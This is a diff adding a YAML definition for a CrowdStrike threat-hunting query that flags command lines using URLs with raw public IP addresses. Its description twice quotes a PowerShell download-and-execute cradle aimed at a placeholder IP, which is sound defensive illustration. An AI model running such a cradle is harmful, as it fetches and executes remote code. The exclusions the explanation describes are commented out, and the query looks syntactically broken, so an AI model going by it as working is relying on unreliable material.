@@ -1,0 +1,98 @@
+# --- Query Metadata ---
+# Human-readable name for the query. Will be displayed as the title.
+name: Detection of External Direct IP Usage in CommandLine Windows and Mac 
+
+# MITRE ATT&CK technique IDs
+mitre_ids:
+  - T1105 T1059T1071.001
+
+# Description of what the query does and its purpose.
+# Using the YAML block scalar `|` allows for multi-line strings.
+description: |
+  Detection of External Direct IP Usage
+  This query detects Windows processes that utilize raw public IP addresses within HTTP/HTTPS URLs in their command-line arguments (e.g., powershell -c IEX(New-Object Net.WebClient).DownloadString('http://1.2.3.4/payload')).
+  
+  This behavior is highly suspicious because legitimate software typically uses domain names (DNS). Attackers often use direct public IPs to host second-stage payloads or C2 servers to bypass DNS filtering and logging mechanisms.
+
+# The author or team that created the query.
+author: sathishds
+
+# The required log sources to run this query successfully in Next-Gen SIEM.
+# This will be displayed in the UI to inform the user.
+log_sources:
+  - Endpoint
+
+# Tags for filtering and categorization.
+# Include relevant techniques, tactics, or platforms.
+tags:
+  - Hunting
+  - Detection
+
+# --- Query Content ---
+# The actual CrowdStrike Query Language (CQL) code.
+# Using the YAML block scalar `|` allows for multi-line strings.
+cql: |
+  in(#event_simpleName, values=["ProcessRollup2","SyntheticProcessRollup2"]) 
+  | CommandLine=*http* event_platform!="Lin"
+  // Basline to exclude legitimate process | !in(field="ParentBaseFileName", values=//["UmbrellaDiagnostic.exe","HPClickExe","Eagle" ,"HPClick.exe"])
+  //| !in(field="FileName", values=["Google Chrome","chrome.exe"])
+  //| !in(field="CommandLine", values=["Google Chrome.app"])
+  | regex("(?<Urlink>\\bhttps?://\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}.*\\/\\b)", field=CommandLine)
+  | regex("(?<Ipaddress>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})", field=Urlink)
+  | !cidr(Ipaddress, subnet=["224.0.0.0/4", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8", "169.254.0.0/16", "168.63.0.0/16", "0.0.0.0/8"])
+  | // Basline to exclude legitimate url !in(field="Urlink", values=[
+    // Basline to exclude legitimate url  "http://100.1.1.1"  
+  ])
+  | default(field=GrandParentBaseFileName, value="Unknown")
+  | rootURL := "https://falcon.crowdstrike.com/"
+  | ProcessStartTime := round(ProcessStartTime)
+  | processStart:=formattime(field=ProcessStartTime, format="%m/%d %H:%M:%S")
+  // If Context Process ID is available utilize it, if not utilize Target Process ID
+  | case{ ContextProcessId ="*" | ContextId:=ContextProcessId; TargetProcessId="*" | ContextId:=TargetProcessId}
+  // Create URLs for Process and Graph Explorers
+  | format("[ProcessExplorer]%sinvestigate/process-explorer/%s/%s?_cid=%s", field=["rootURL", "aid", "ContextId", "cid"], as="ProcessExplorer")
+  | format("[GraphExplorer]%sgraphs/process-explorer/graph?id=pid:%s:%s", field=["rootURL", "aid", "TargetProcessId"], as="GraphExplorer")
+  // Format Execution Details for easy analysis
+  | format(format="%s\n\t↳ %s[ppid=%s]\n\t\t↳ %s [pid=%s|raw_pid=%s|start=%s]\n\t\t\t%,.100s[...TRIMMED]\n\t\t\t%s\n\t\t\t%s\n---", field=[GrandParentBaseFileName, ParentBaseFileName, ParentProcessId, ImageFileName, TargetProcessId, RawProcessId, processStart, CommandLine, ProcessExplorer, GraphExplorer], as="ExecutionSummary")
+  // Group by Source Host
+  | groupBy([ComputerName],function=([count(aid, as=executeCount), min(@timestamp, as=firstSeen), max(@timestamp, as=lastSeen), collect([UserName,ExecutionSummary,Ipaddress,ParentBaseFileName,ParentProcessId,ImageFileName,TargetProcessId], limit=1000)]))
+  | firstSeen:=formattime(field=firstSeen, format="%Y/%m/%d %H:%M:%S")
+  | lastSeen:=formattime(field=lastSeen, format="%Y/%m/%d %H:%M:%S")
+
+# Explanation of the query.
+# Using the YAML block scalar `|` allows for multi-line strings.
+# Uses markdown for formatting on the webpage.
+explanation: |
+  Query Description: Detection of External Direct IP Usage
+  This query detects Windows processes that utilize raw public IP addresses within HTTP/HTTPS URLs in their command-line arguments (e.g., powershell -c IEX(New-Object Net.WebClient).DownloadString('http://1.2.3.4/payload')).
+  
+  This behavior is highly suspicious because legitimate software typically uses domain names (DNS). Attackers often use direct public IPs to host second-stage payloads or C2 servers to bypass DNS filtering and logging mechanisms.
+  
+  Key Logic Breakdown
+  Scope & Filter:
+  
+  Targets Windows process creation events (ProcessRollup2).
+  
+  Filters for command lines containing http.
+  
+  Exclusions: Removes known noisy applications (e.g., Chrome, HP Click, Umbrella) to reduce false positives.
+  
+  Extraction (Regex):
+  
+  It scans the command line to extract a URL specifically formatted with an IPv4 address (e.g., http://x.x.x.x/...).
+  
+  It isolates the IP address from that URL into a field called Ipaddress.
+  
+  Public IP Validation:
+  
+  It uses !cidr(...) to exclude all standard private and reserved IP ranges (Localhost, 10.x, 192.168.x, 172.16.x, APIPA, etc.).
+  
+  This ensures the query only alerts on Public/External IPs.
+  
+  Formatting & Triage:
+  
+  It generates a clickable ExecutionSummary that includes the Parent Process, the Target Image, and the specific Command Line.
+  
+  It generates direct links (ProcessExplorer, GraphExplorer) to the Falcon console for immediate investigation.
+  
+  Aggregation: The results are grouped by ComputerName, showing how many times the event occurred and the first/last time it was seen.
